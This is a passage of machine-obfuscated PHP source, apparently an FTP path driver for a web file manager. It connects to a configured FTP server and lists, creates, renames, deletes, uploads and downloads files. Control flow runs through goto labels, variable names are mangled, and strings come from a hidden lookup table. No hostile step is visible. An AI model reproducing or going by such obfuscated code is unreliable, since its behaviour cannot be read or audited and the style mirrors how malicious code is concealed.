private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($c—πıñé˘ó) { parent::__construct(); if (count($c—πıñé˘ó) > 0) { $this->_init($c—πıñé˘ó); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($BúÁ›¯¡‹ƒ) { $eß—◊çÑÀÏ =& $_SERVER[ú∫]; global $config; $this->appCharset = $config[$eß—◊çÑÀÏ[1242]]; $this->systemCharset = $config[$eß—◊çÑÀÏ[1243]]; if (isset($BúÁ›¯¡‹ƒ[$eß—◊çÑÀÏ[1244]]) && $BúÁ›¯¡‹ƒ[$eß—◊çÑÀÏ[1244]]) { $this->systemCharset = $BúÁ›¯¡‹ƒ[$eß—◊çÑÀÏ[1244]]; } } public function iconvApp($A∆íÇÇß«) { return $this->iconvTo($A∆íÇÇß«, $this->systemCharset, $this->appCharset); } public function iconvSystem($Cµæ◊√æé≥) { return $this->iconvTo($Cµæ◊√æé≥, $this->appCharset, $this->systemCharset); } public function getPathOuter($Eñ€È¨‡∑€) { goto f‘œƒ ·…Ê; Eœ¯Øò»ûã: if (substr($d≠≈˘ûÍ√», 0, 2) == $B‡¨¬Ûœ˜°[1245]) { $d≠≈˘ûÍ√» = BASIC_PATH . substr($d≠≈˘ûÍ√», 2); } if (substr($Eñ€È¨‡∑€, 0, 2) == $B‡¨¬Ûœ˜°[1245]) { $Eñ€È¨‡∑€ = BASIC_PATH . substr($Eñ€È¨‡∑€, 2); } $d≠≈˘ûÍ√» = KodIO::clear($d≠≈˘ûÍ√»); goto Aúö¯Ï—Ò€; c›∏ÛﬁÕÿ⁄: return $this->pathDriver . $B‡¨¬Ûœ˜°[8] . ltrim($Eñ€È¨‡∑€, $B‡¨¬Ûœ˜°[8]); goto aΩ€»Ïóáü; Aúö¯Ï—Ò€: $Eñ€È¨‡∑€ = KodIO::clear($Eñ€È¨‡∑€); $Eñ€È¨‡∑€ = substr($Eñ€È¨‡∑€, strlen($d≠≈˘ûÍ√»)); if (empty($this->pathDriver)) { return $Eñ€È¨‡∑€; } goto c›∏ÛﬁÕÿ⁄; f‘œƒ ·…Ê: $B‡¨¬Ûœ˜° =& $_SERVER[ú∫]; $d≠≈˘ûÍ√» = $this->iconvApp($this->pathBase); $Eñ€È¨‡∑€ = $this->iconvApp($Eñ€È¨‡∑€); goto Eœ¯Øò»ûã; aΩ€»Ïóáü: } private function _init($bﬂ¨≠»∂¬ú = array()) { $bí†±àÜÏÍ =& $_SERVER[ú∫]; if (!function_exists($bí†±àÜÏÍ[1246])) { throw new Exception(LNG($bí†±àÜÏÍ[1247])); } $this->config = $bﬂ¨≠»∂¬ú; $this->charsetReset($bﬂ¨≠»∂¬ú); foreach ($bﬂ¨≠»∂¬ú as $B”æØ«≠Ô => $FÑÕ±Ø£à∂) { if (isset($this->{$B”æØ«≠Ô})) { $this->{$B”æØ«≠Ô} = $FÑÕ±Ø£à∂; } } return $this->_login($bﬂ¨≠»∂¬ú); } private function _login($DƒéºØƒÔÍ) { goto B´∞ì¿»Ö‹; d©§“Œ›ü∞: $bΩ¥ÑâŒ…∞ = isset($f£ºé¶∞¶†[$e∏É◊À¿äÕ[174]]) && $f£ºé¶∞¶†[$e∏É◊À¿äÕ[174]] == $e∏É◊À¿äÕ[1248] ? !0 : !1; $this->scheme = $bΩ¥ÑâŒ…∞ ? $e∏É◊À¿äÕ[1249] : $e∏É◊À¿äÕ[1250]; $this->port = isset($f£ºé¶∞¶†[$e∏É◊À¿äÕ[176]]) ? $f£ºé¶∞¶†[$e∏É◊À¿äÕ[176]] : 21; goto eùãõöæÃº; F¥Ïñ–èÂÉ: $DÃÀ∏ëÏÆ[$C±Œéæô∂ó] = array($e∏É◊À¿äÕ[1251] => $this->connect, $e∏É◊À¿äÕ[175] => $this->host, $e∏É◊À¿äÕ[174] => $this->scheme, $e∏É◊À¿äÕ[176] => $this->port); return $a∫ﬁÌ£ºï™; goto eí£ç§Æà; eùãõöæÃº: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $a∫ﬁÌ£ºï™ = @ftp_login($this->connect, $this->username, $this->userpass); goto Bî¨ªæºƒä; dá∑îŸ≈”ñ: if (isset($DÃÀ∏ëÏÆ[$C±Œéæô∂ó])) { foreach ($DÃÀ∏ëÏÆ[$C±Œéæô∂ó] as $AÊ‘êËÜàì => $fêÓ…”ÈãÑ) { $this->{$AÊ‘êËÜàì} = $fêÓ…”ÈãÑ; } return !0; } $f£ºé¶∞¶† = parse_url(trim($this->server, $e∏É◊À¿äÕ[8])); $this->host = $f£ºé¶∞¶†[$e∏É◊À¿äÕ[175]]; goto d©§“Œ›ü∞; Bî¨ªæºƒä: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $cº‚ó«ë“õ = $this->pasv == $e∏É◊À¿äÕ[87] ? !0 : !1; @ftp_pasv($this->connect, $cº‚ó«ë“õ); goto F¥Ïñ–èÂÉ; B´∞ì¿»Ö‹: $e∏É◊À¿äÕ =& $_SERVER[ú∫]; static $DÃÀ∏ëÏÆ = array(); $C±Œéæô∂ó = md5(json_encode($DƒéºØƒÔÍ)); goto dá∑îŸ≈”ñ; eí£ç§Æà: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($Dâ„Á∞ø√…, $Dƒ£ç‚à∆ß = '', $bïôäìá…  = REPEAT_RENAME) { if ($this->setContent($Dâ„Á∞ø√…, $Dƒ£ç‚à∆ß)) { return $this->getPathOuter($Dâ„Á∞ø√…); } return !1; } public function mkdir($C≤£ëçîÖŸ, $f√â€ÒÚ‹œ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $C≤£ëçîÖŸ = $this->iconvSystem($C≤£ëçîÖŸ); if ($this->_isFolder($C≤£ëçîÖŸ) || @ftp_mkdir($this->connect, $C≤£ëçîÖŸ)) { return $this->getPathOuter($C≤£ëçîÖŸ); } if (!$this->mkdir($this->pathFather($C≤£ëçîÖŸ))) { return !1; } if ($C≤£ëçîÖŸ = @ftp_mkdir($this->connect, $C≤£ëçîÖŸ)) { return $this->getPathOuter($C≤£ëçîÖŸ); } return !1; } public function copyFile($dËòÌü‘ÇË, $E‘ù≈Æ∂“º) { goto E†∆≥Œ¬É±; bà“Ê≈á¯™: $this->tempFileRemve($eÂÏéîÍçá); return $dÍÚÃç°ç‚; goto dªé∂”Ôê∞; fﬂ«èÁΩ˘ä: $f»Òó‹åÏ˘ = $this->iconvApp($eÂÏéîÍçá); $this->download($dËòÌü‘ÇË, $f»Òó‹åÏ˘); $dÍÚÃç°ç‚ = $this->upload($E‘ù≈Æ∂“º, $f»Òó‹åÏ˘); goto bà“Ê≈á¯™; E†∆≥Œ¬É±: if (!$this->_isconn()) { return !1; } $e±Æù¥Ëºä = $this->pathThis($this->iconvSystem($dËòÌü‘ÇË)); $eÂÏéîÍçá = $this->tempFile($e±Æù¥Ëºä); goto fﬂ«èÁΩ˘ä; dªé∂”Ôê∞: } public function moveFile($BÂŸ◊°ìÎ‘, $d€ıæÊ∞ﬂ¿) { if (!$this->_isconn()) { return !1; } $BÂŸ◊°ìÎ‘ = $this->iconvSystem($BÂŸ◊°ìÎ‘); $d€ıæÊ∞ﬂ¿ = $this->iconvSystem($d€ıæÊ∞ﬂ¿); $fËÃ∂ñÎù€ = @ftp_rename($this->connect, $BÂŸ◊°ìÎ‘, $d€ıæÊ∞ﬂ¿); return $fËÃ∂ñÎù€ ? $this->getPathOuter($d€ıæÊ∞ﬂ¿) : !1; } public function delFile($fö§´Â€‘Ω) { if (!$this->_isconn()) { return !1; } $fö§´Â€‘Ω = $this->iconvSystem($fö§´Â€‘Ω); return @ftp_delete($this->connect, $fö§´Â€‘Ω); } public function delFolder($DÑµÑÀﬁÙÖ) { goto b¢Ñ≠ëÊ¨‹; a˜üÂªÙÑ§: foreach ($bÿÏ¯ﬂüÙé as $B—†∆µ…åÊ) { $B—†∆µ…åÊ = $this->iconvSystem($B—†∆µ…åÊ); $Eﬁ‹€á≈· = @ftp_rmdir($this->connect, $B—†∆µ…åÊ); if (!$Eﬁ‹€á≈·) { return !1; } } $DÑµÑÀﬁÙÖ = $this->iconvSystem($DÑµÑÀﬁÙÖ); return @ftp_rmdir($this->connect, $DÑµÑÀﬁÙÖ); goto D•ØÕ¥±íı; DÀ¿≈∫Ü÷í: $this->fileList($DÑµÑÀﬁÙÖ, $bÿÏ¯ﬂüÙé, $CÖñﬁ¯Î∑™, !0); $this->listItemCache = !0; foreach ($CÖñﬁ¯Î∑™ as $c±äìäﬂÓÌ) { $B—†∆µ…åÊ = $this->iconvSystem($c±äìäﬂÓÌ[$_SERVER[ú∫][28]]); $Eﬁ‹€á≈· = @ftp_delete($this->connect, $B—†∆µ…åÊ); if (!$Eﬁ‹€á≈·) { return !1; } } goto a˜üÂªÙÑ§; b¢Ñ≠ëÊ¨‹: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $bÿÏ¯ﬂüÙé = $CÖñﬁ¯Î∑™ = array(); goto DÀ¿≈∫Ü÷í; D•ØÕ¥±íı: } public function rename($Eø’€ç≤Ñã, $cÒÚâË…™«) { goto bÔ˜…Àç‘≥; DÎÆÔø¬±§: $AõΩ√óπÚÏ = rtrim($fπõ´®§«’, $C∑ñèŸÍäÃ[8]) . $C∑ñèŸÍäÃ[8] . $dÆëòæ©Ëí; $b∫»µÏ Ç≠ = @ftp_rename($this->connect, $Eø’€ç≤Ñã, $AõΩ√óπÚÏ); $AõΩ√óπÚÏ = $this->iconvApp($AõΩ√óπÚÏ); goto bÔ‘¥ŒêØÂ; bÔ˜…Àç‘≥: $C∑ñèŸÍäÃ =& $_SERVER[ú∫]; if (!$this->_isconn()) { return !1; } $dÆëòæ©Ëí = $this->fileNameAuto($this->pathFather($Eø’€ç≤Ñã), $cÒÚâË…™«); goto eÂúÍÉıö£; bÔ‘¥ŒêØÂ: return $b∫»µÏ Ç≠ ? $this->getPathOuter($AõΩ√óπÚÏ) : !1; goto c£⁄ÿ¡Óı∆; eÂúÍÉıö£: $dÆëòæ©Ëí = $this->iconvSystem($dÆëòæ©Ëí); $Eø’€ç≤Ñã = $this->iconvSystem($Eø’€ç≤Ñã); $fπõ´®§«’ = $this->pathFather($Eø’€ç≤Ñã); goto DÎÆÔø¬±§; c£⁄ÿ¡Óı∆: } private function folderInfo($EÃÆ¶√ ä≤, $béÙëÆäª“ = false) { $aØÎçé∏≤‘ =& $_SERVER[ú∫]; $F¢‘Ô—◊≈ = array($aØÎçé∏≤‘[28] => $this->pathThis($EÃÆ¶√ ä≤), $aØÎçé∏≤‘[76] => $this->getPathOuter($aØÎçé∏≤‘[8] . $EÃÆ¶√ ä≤), $aØÎçé∏≤‘[29] => $aØÎçé∏≤‘[77]); if ($béÙëÆäª“) { return $F¢‘Ô—◊≈; } $F¢‘Ô—◊≈[$aØÎçé∏≤‘[194]] = $F¢‘Ô—◊≈[$aØÎçé∏≤‘[84]] = 0; $F¢‘Ô—◊≈[$aØÎçé∏≤‘[195]] = $F¢‘Ô—◊≈[$aØÎçé∏≤‘[196]] = !0; return $F¢‘Ô—◊≈; } private function fileInfo($e‘≈Œ÷µ¯à, $d≠ÊËÇì°Ô = false, $c£∞∂°¯«Ê = array()) { goto aÜòÚÇπê«; bÊ”î ú«ä: $AÑÇÓÃπÏê[$fÏÒö∏Â…è[194]] = $AÑÇÓÃπÏê[$fÏÒö∏Â…è[84]] = 0; $AÑÇÓÃπÏê[$fÏÒö∏Â…è[195]] = $AÑÇÓÃπÏê[$fÏÒö∏Â…è[196]] = !0; $C≈ºÉ∂µÃ  = $this->iconvSystem($e‘≈Œ÷µ¯à); goto DéºèÌèñÑ; aÜòÚÇπê«: $fÏÒö∏Â…è =& $_SERVER[ú∫]; $AÑÇÓÃπÏê = array($fÏÒö∏Â…è[28] => $this->pathThis($e‘≈Œ÷µ¯à), $fÏÒö∏Â…è[76] => $this->getPathOuter($fÏÒö∏Â…è[8] . $e‘≈Œ÷µ¯à), $fÏÒö∏Â…è[29] => $fÏÒö∏Â…è[193], $fÏÒö∏Â…è[78] => isset($c£∞∂°¯«Ê[$fÏÒö∏Â…è[78]]) ? $c£∞∂°¯«Ê[$fÏÒö∏Â…è[78]] : 0, $fÏÒö∏Â…è[168] => $this->ext($e‘≈Œ÷µ¯à)); if ($d≠ÊËÇì°Ô) { return $AÑÇÓÃπÏê; } goto bÊ”î ú«ä; b∏Â¬„‡‹É: return $AÑÇÓÃπÏê; goto C›√ ¨¯Âû; DéºèÌèñÑ: $AÑÇÓÃπÏê[$fÏÒö∏Â…è[84]] = @ftp_mdtm($this->connect, $C≈ºÉ∂µÃ ); if (empty($c£∞∂°¯«Ê)) { $c£∞∂°¯«Ê = $this->objectMeta($e‘≈Œ÷µ¯à); if (!$c£∞∂°¯«Ê) { return $AÑÇÓÃπÏê; } } $AÑÇÓÃπÏê[$fÏÒö∏Â…è[78]] = $c£∞∂°¯«Ê[$fÏÒö∏Â…è[78]]; goto b∏Â¬„‡‹É; C›√ ¨¯Âû: } public function size($fìŸÌòﬂ Ñ) { $F∆ÒÍºØ’π = $this->objectMeta($fìŸÌòﬂ Ñ); return $F∆ÒÍºØ’π ? $F∆ÒÍºØ’π[$_SERVER[ú∫][78]] : 0; } public function info($cˆ∑ù∂Èæµ) { if ($this->isFile($cˆ∑ù∂Èæµ)) { return $this->fileInfo($cˆ∑ù∂Èæµ, 0); } else { if ($this->isFolder($cˆ∑ù∂Èæµ)) { return $this->folderInfo($cˆ∑ù∂Èæµ); } } return !1; } private function fileList($AñËø∆“⁄Ì, &$B≈Ì—äÜ÷‰, &$aè©”ùèÏ†, $B‘∆ìò¥∂Ç = false) { goto c√âáéÂøÎ; c√âáéÂøÎ: $e¢Êüò√•© =& $_SERVER[ú∫]; $AñËø∆“⁄Ì = $this->iconvSystem($AñËø∆“⁄Ì); if (!$this->isFolder($AñËø∆“⁄Ì)) { return !1; } goto aª”»åÜßﬂ; aª”»åÜßﬂ: @ftp_chdir($this->connect, $e¢Êüò√•©[8]); $AñËø∆“⁄Ì = rtrim($AñËø∆“⁄Ì, $e¢Êüò√•©[8]) . $e¢Êüò√•©[8]; check_abort(); goto e£±†Ì‚ñ; e£±†Ì‚ñ: $Dæóœ—óº› = $this->listItemCache === !1 ? !1 : !0; $D‹ó‡Ìü∞€ = @ftp_rawlist($this->connect, $AñËø∆“⁄Ì); if (!$D‹ó‡Ìü∞€) { $D‹ó‡Ìü∞€ = array(); } goto f∏èãΩò·ﬁ; f∏èãΩò·ﬁ: $cÍÍã›úØ˜ = array($e¢Êüò√•©[95] => 1, $e¢Êüò√•©[1252] => 1); foreach ($D‹ó‡Ìü∞€ as $Fﬂ‘Î∑πﬁƒ) { goto BÂ‹»æñÓÈ; BÂ‹»æñÓÈ: $AÀ— ∞Ûªò = $this->_listItem($Fﬂ‘Î∑πﬁƒ); if ($AÀ— ∞Ûªò[0] == $e¢Êüò√•©[719]) { continue; } $cúÍÉúºÉ  = $AÀ— ∞Ûªò[8]; goto C™ŒÚ∆∏‚›; D’í∂ï¥∞º: if (substr($Fﬂ‘Î∑πﬁƒ, 0, 1) == $e¢Êüò√•©[1253]) { $EÉ’ÓΩ∑Öõ[$e¢Êüò√•©[29]] = $e¢Êüò√•©[77]; $EÉ’ÓΩ∑Öõ[$e¢Êüò√•©[78]] = 0; } $cŒ“ﬁÏ÷Ö≈ = $EÉ’ÓΩ∑Öõ[$e¢Êüò√•©[29]] == $e¢Êüò√•©[77] ? !0 : !1; if ($Dæóœ—óº›) { $this->cacheMethod($e¢Êüò√•©[199], $cúÍÉúºÉ , $cŒ“ﬁÏ÷Ö≈); $this->cacheMethod($e¢Êüò√•©[200], $cúÍÉúºÉ , $EÉ’ÓΩ∑Öõ); } goto c‡ªıçË–»; c‡ªıçË–»: if ($cŒ“ﬁÏ÷Ö≈) { $B≈Ì—äÜ÷‰[] = $cúÍÉúºÉ ; if ($B‘∆ìò¥∂Ç) { $this->fileList($cúÍÉúºÉ , $B≈Ì—äÜ÷‰, $aè©”ùèÏ†, $B‘∆ìò¥∂Ç); } continue; } $aè©”ùèÏ†[] = $EÉ’ÓΩ∑Öõ; goto A∏ÆõõÒÏÑ; C™ŒÚ∆∏‚›: if (empty($cúÍÉúºÉ ) && $cúÍÉúºÉ  !== $e¢Êüò√•©[191] || isset($cÍÍã›úØ˜[$cúÍÉúºÉ ])) { continue; } $cúÍÉúºÉ  = $this->iconvApp($AñËø∆“⁄Ì . ltrim($cúÍÉúºÉ , $e¢Êüò√•©[8])); $EÉ’ÓΩ∑Öõ = array($e¢Êüò√•©[28] => $cúÍÉúºÉ , $e¢Êüò√•©[29] => $e¢Êüò√•©[193], $e¢Êüò√•©[78] => $AÀ— ∞Ûªò[4]); goto D’í∂ï¥∞º; A∏ÆõõÒÏÑ: } if ($Dæóœ—óº›) { $this->cacheMethod($e¢Êüò√•©[199], $AñËø∆“⁄Ì, !0); } goto fªëâË‰≥±; fªëâË‰≥±: } private function _listItem($A≥ÜÆûå…Ú) { if (empty($A≥ÜÆûå…Ú)) { return array(); } $BêÊÙ⁄¬Ã† = preg_split($_SERVER[ú∫][1254], $A≥ÜÆûå…Ú); if (count($BêÊÙ⁄¬Ã†) <= 9) { return $BêÊÙ⁄¬Ã†; } $BêÊÙ⁄¬Ã†[8] = trim(substr($A≥ÜÆûå…Ú, strpos($A≥ÜÆûå…Ú, $BêÊÙ⁄¬Ã†[7]) + strlen($BêÊÙ⁄¬Ã†[7]))); return array_splice($BêÊÙ⁄¬Ã†, 0, 9); } public function listPath($CÈåÉï§Óó, $a«ú”ù¥ã– = false) { goto dÿöñ¯∫åﬂ; b˘æ ©ﬁ≥∑: return array($F≠è–πèﬁœ[75] => $bÿ«¯ÛÑè», $F≠è–πèﬁœ[74] => $d·ñ∞‘‚≥); goto dÃˆûÛÃ∑ı; E¯π‚ªÍçÜ: $this->fileList($CÈåÉï§Óó, $bÿ«¯ÛÑè», $d·ñ∞‘‚≥); foreach ($bÿ«¯ÛÑè» as $dÑÖáíﬁÎ« => $f´àñõç…◊) { $bÿ«¯ÛÑè»[$dÑÖáíﬁÎ«] = $this->folderInfo($f´àñõç…◊, $a«ú”ù¥ã–); } foreach ($d·ñ∞‘‚≥ as $dÑÖáíﬁÎ« => $f´àñõç…◊) { $d·ñ∞‘‚≥[$dÑÖáíﬁÎ«] = $this->fileInfo($f´àñõç…◊[$F≠è–πèﬁœ[28]], $a«ú”ù¥ã–, $f´àñõç…◊); } goto b˘æ ©ﬁ≥∑; dÿöñ¯∫åﬂ: $F≠è–πèﬁœ =& $_SERVER[ú∫]; if (!$this->_isconn()) { return !1; } $bÿ«¯ÛÑè» = $d·ñ∞‘‚≥ = array(); goto E¯π‚ªÍçÜ; dÃˆûÛÃ∑ı: } public function has($C‘Âπ–¨◊à, $Eú…·ù·ÉÕ = false, $b†ÈçÎíäÏ = true) { goto a¨ﬂıô¢∏‡; cõ‹áòÙôà: $this->fileList($C‘Âπ–¨◊à, $BËÚµà›∑Ù, $Eå∞Ùóì”ê, $b§¥Ô∞€âû); if ($Eú…·ù·ÉÕ) { return array($BôﬂÎÙ¯€Ñ[203] => count($Eå∞Ùóì”ê), $BôﬂÎÙ¯€Ñ[204] => count($BËÚµà›∑Ù)); } if ($b†ÈçÎíäÏ) { if (count($Eå∞Ùóì”ê)) { return !0; } } else { if (count($BËÚµà›∑Ù)) { return !0; } } goto cå ¨≤±’Æ; a¨ﬂıô¢∏‡: $BôﬂÎÙ¯€Ñ =& $_SERVER[ú∫]; $BËÚµà›∑Ù = $Eå∞Ùóì”ê = array(); $b§¥Ô∞€âû = $Eú…·ù·ÉÕ ? !0 : !1; goto cõ‹áòÙôà; cå ¨≤±’Æ: return !1; goto Aß—Ô∆îØô; Aß—Ô∆îØô: } public function listAll($bã‹§Ëª‰á) { goto AÕ§¢Ü¶Ãô; e´ö¶çÉ¯Ñ: foreach ($eï∂˘Â—í◊ as $fÚÈº¡˜É∏) { if (is_string($fÚÈº¡˜É∏)) { $a‘ò ŸÖπ¯[$fÚÈº¡˜É∏] = 0; } } return $this->listAllFiles($bã‹§Ëª‰á, array_keys($a‘ò ŸÖπ¯), $a‘ò ŸÖπ¯); goto cÇŸ¿Ùäã∂; bõø‹ ïÆä: $this->fileList($bã‹§Ëª‰á, $eï∂˘Â—í◊, $e≠“ÜÉÓ≠§, !0); $a‘ò ŸÖπ¯ = array(); foreach ($e≠“ÜÉÓ≠§ as $fÚÈº¡˜É∏) { $a‘ò ŸÖπ¯[$fÚÈº¡˜É∏[$Aõ¿…Ù∆¨Ü[28]]] = $fÚÈº¡˜É∏[$Aõ¿…Ù∆¨Ü[78]]; } goto e´ö¶çÉ¯Ñ; AÕ§¢Ü¶Ãô: $Aõ¿…Ù∆¨Ü =& $_SERVER[ú∫]; if (!$this->_isconn()) { return !1; } $eï∂˘Â—í◊ = $e≠“ÜÉÓ≠§ = array(); goto bõø‹ ïÆä; cÇŸ¿Ùäã∂: } public function getContent($F€®…Òºƒ≈) { if (!$this->_isconn()) { return !1; } $F€®…Òºƒ≈ = $this->iconvSystem($F€®…Òºƒ≈); return $this->fileSubstr($F€®…Òºƒ≈); } public function setContent($cÛ¢âô≥Ï≥, $F«≈Ö®÷áº = '') { goto bÈã®∏…√á; e≈ £≈ñ…Ü: return $DËÀ‚•é∆ˆ; goto E∂ÒÜÇÂÀ∞; c¿«è≈π¢Û: file_put_contents($bê∆ﬂˆ≤‹è, $F«≈Ö®÷áº); $DËÀ‚•é∆ˆ = $this->upload($cÛ¢âô≥Ï≥, $this->iconvApp($bê∆ﬂˆ≤‹è)); $this->tempFileRemve($bê∆ﬂˆ≤‹è); goto e≈ £≈ñ…Ü; bÈã®∏…√á: if (!$this->_isconn()) { return !1; } $E˜ÆÎÆßù… = $this->pathThis($this->iconvSystem($cÛ¢âô≥Ï≥)); $bê∆ﬂˆ≤‹è = $this->tempFile($E˜ÆÎÆßù…); goto c¿«è≈π¢Û; E∂ÒÜÇÂÀ∞: } public function fileSubstr($bªΩœëáº«, $dÔÇè•≈ÑÀ = 0, $Cëê©≥‰”‹ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($bªΩœëáº«, $dÔÇè•≈ÑÀ, $Cëê©≥‰”‹); } private function ftpRequest($dã„·ı©Ò›, $Cüáº‚›íÉ = 0, $Bäƒï‰§Û = false) { goto Eîâ≥ã§Ö’; cÉä–—ÖÎæ: return $Búÿ´Ô†ì∆; goto e∞Ûπíãë≈; f‚ø–˜ÙÔÂ: curl_setopt($c¯ƒñ™Œ⁄Î, CURLOPT_RETURNTRANSFER, 1); $Búÿ´Ô†ì∆ = curl_exec($c¯ƒñ™Œ⁄Î); curl_close($c¯ƒñ™Œ⁄Î); goto cÉä–—ÖÎæ; E·á∆Ø¿€ä: curl_setopt($c¯ƒñ™Œ⁄Î, CURLOPT_URL, $CíÖ˜€ÆôŒ . $this->pathEncode($dã„·ı©Ò›)); curl_setopt($c¯ƒñ™Œ⁄Î, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($Bäƒï‰§Û) { $Fè∫òÓãµÜ = $Cüáº‚›íÉ + $Bäƒï‰§Û - 1; curl_setopt($c¯ƒñ™Œ⁄Î, CURLOPT_RANGE, "{$Cüáº‚›íÉ}\x2d{$Fè∫òÓãµÜ}"); } goto f‚ø–˜ÙÔÂ; Eîâ≥ã§Ö’: $dã„·ı©Ò› = $this->iconvSystem($dã„·ı©Ò›); $CíÖ˜€ÆôŒ = $this->scheme . $this->host . $_SERVER[ú∫][4] . $this->port; $c¯ƒñ™Œ⁄Î = curl_init(); goto E·á∆Ø¿€ä; e∞Ûπíãë≈: } public function upload($aúÜ˜’Îàı, $cÒº¬ı »Î, $câ¿Àâ–Ç• = false, $dæÜñ‰í˘Ã = REPEAT_REPLACE) { goto A»Úâù·é›; bã«Àà˘≥∑: $cÒº¬ı »Î = $this->iconvSystem($cÒº¬ı »Î); $EÁ∫À¨ÑÂ› = ftp_nb_put($this->connect, $aúÜ˜’Îàı, $cÒº¬ı »Î, FTP_BINARY); while ($EÁ∫À¨ÑÂ› == FTP_MOREDATA) { $EÁ∫À¨ÑÂ› = ftp_nb_continue($this->connect); } goto cáä∫˜¢€ï; A»Úâù·é›: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($aúÜ˜’Îàı))) { return !1; } $aúÜ˜’Îàı = $this->iconvSystem($aúÜ˜’Îàı); goto bã«Àà˘≥∑; cáä∫˜¢€ï: if ($EÁ∫À¨ÑÂ› != FTP_FINISHED) { return !1; } return $this->getPathOuter($aúÜ˜’Îàı); goto aÒ∂…ØÎÁô; aÒ∂…ØÎÁô: } public function download($Béî–éÍü„, $E∑ãÉ¿óï… = '') { goto CÊ››ë–¶Á; b›é™ﬂ´Èû: $Béî–éÍü„ = $this->iconvSystem($Béî–éÍü„); $E∑ãÉ¿óï… = $this->iconvSystem($E∑ãÉ¿óï…); $FôÖ°«¶ø… = ftp_nb_get($this->connect, $E∑ãÉ¿óï…, $Béî–éÍü„, FTP_BINARY); goto E≠–¢ Ô≠ã; E≠–¢ Ô≠ã: while ($FôÖ°«¶ø… == FTP_MOREDATA) { $FôÖ°«¶ø… = ftp_nb_continue($this->connect); } if ($FôÖ°«¶ø… != FTP_FINISHED) { return !1; } return $this->iconvApp($E∑ãÉ¿óï…); goto céÔúúÂïë; CÊ››ë–¶Á: if (!$this->_isconn()) { return !1; } $B£áÍ∫¥¨ﬂ = $this->pathFather($E∑ãÉ¿óï…); if (!IO::mkdir($B£áÍ∫¥¨ﬂ)) { return !1; } goto b›é™ﬂ´Èû; céÔúúÂïë: } public function exist($b·˘‚òå‡È) { return $this->isFile($b·˘‚òå‡È) || $this->isFolder($b·˘‚òå‡È); } public function isFile($CÛÈ‹·óÛƒ) { return !$this->isFolder($CÛÈ‹·óÛƒ) && $this->objectMeta($CÛÈ‹·óÛƒ); } public function isFolder($b¡‹Ë¬≥É¿) { return $this->cacheMethod($_SERVER[ú∫][199], $b¡‹Ë¬≥É¿); } protected function objectMeta($D≤ı∂”ƒ¶ñ) { return $this->cacheMethod($_SERVER[ú∫][200], $D≤ı∂”ƒ¶ñ); } protected function _objectMeta($E¨–ö—ë”Î) { goto F∂Ñà«÷«À; d™∞∞´õäÍ: $EªÇâ∏…ëÙ = @ftp_size($this->connect, $E¨–ö—ë”Î); if ($EªÇâ∏…ëÙ != -1) { $bë∏¡î¯ÔŸ[$c é∂™ŸˆÀ[78]] = $EªÇâ∏…ëÙ; } else { $f˜∫öü§Öä = @ftp_chdir($this->connect, $E¨–ö—ë”Î); if (!$f˜∫öü§Öä) { return !1; } $bë∏¡î¯ÔŸ[$c é∂™ŸˆÀ[29]] = $c é∂™ŸˆÀ[77]; } return $bë∏¡î¯ÔŸ; goto Bä÷†√Æ©ä; F∂Ñà«÷«À: $c é∂™ŸˆÀ =& $_SERVER[ú∫]; if ($E¨–ö—ë”Î == $c é∂™ŸˆÀ[33] || $E¨–ö—ë”Î == $c é∂™ŸˆÀ[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto E´åÒÂ‹ÑÏ; E´åÒÂ‹ÑÏ: $E¨–ö—ë”Î = $this->iconvSystem($E¨–ö—ë”Î); $bë∏¡î¯ÔŸ = array($c é∂™ŸˆÀ[28] => $this->iconvApp($E¨–ö—ë”Î), $c é∂™ŸˆÀ[29] => $c é∂™ŸˆÀ[193], $c é∂™ŸˆÀ[78] => 0); @ftp_chdir($this->connect, $c é∂™ŸˆÀ[8]); goto d™∞∞´õäÍ; Bä÷†√Æ©ä: } protected function _isFolder($f≥æ¢üˆÊÏ) { $Aâ…÷í•ÌÇ =& $_SERVER[ú∫]; if ($f≥æ¢üˆÊÏ == $Aâ…÷í•ÌÇ[33] || $f≥æ¢üˆÊÏ == $Aâ…÷í•ÌÇ[8]) { return !0; } $cÏü≤§•ó∆ = $this->_objectMeta($f≥æ¢üˆÊÏ); return isset($cÏü≤§•ó∆[$Aâ…÷í•ÌÇ[29]]) && $cÏü≤§•ó∆[$Aâ…÷í•ÌÇ[29]] == $Aâ…÷í•ÌÇ[77] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($b“·√˜á≤ ) { if (substr($b“·√˜á≤ , 0, 2) == $_SERVER[ú∫][1245]) { $b“·√˜á≤  = BASIC_PATH . substr($b“·√˜á≤ , 2); } return $b“·√˜á≤ ; } public function iconvApp($Eóá≤ãÓÏ≥) { $Búë¿π©£« =& $_SERVER[ú∫]; global $config; return $this->iconvTo($Eóá≤ãÓÏ≥, $config[$Búë¿π©£«[1243]], $config[$Búë¿π©£«[1242]]); } public function iconvSystem($c∏£†À”ØÜ) { $bΩ´áÑíÙ° =& $_SERVER[ú∫]; global $config; return $this->iconvTo($c∏£†À”ØÜ, $config[$bΩ´áÑíÙ°[1242]], $config[$bΩ´áÑíÙ°[1243]]); } public function getPathOuter($fÒÑ∂·˜ÉÌ) { goto eÑÛñ‰⁄úΩ; eÑÛñ‰⁄úΩ: $e©âÍå˜…° =& $_SERVER[ú∫]; $Eù”∑ﬂáÎÒ = $this->iconvApp($this->pathBase); $fÒÑ∂·˜ÉÌ = $this->iconvApp($fÒÑ∂·˜ÉÌ); goto DÇæÑÎöÎÑ; DÇæÑÎöÎÑ: if (substr($Eù”∑ﬂáÎÒ, 0, 2) == $e©âÍå˜…°[1245]) { $Eù”∑ﬂáÎÒ = BASIC_PATH . substr($Eù”∑ﬂáÎÒ, 2); } if (substr($fÒÑ∂·˜ÉÌ, 0, 2) == 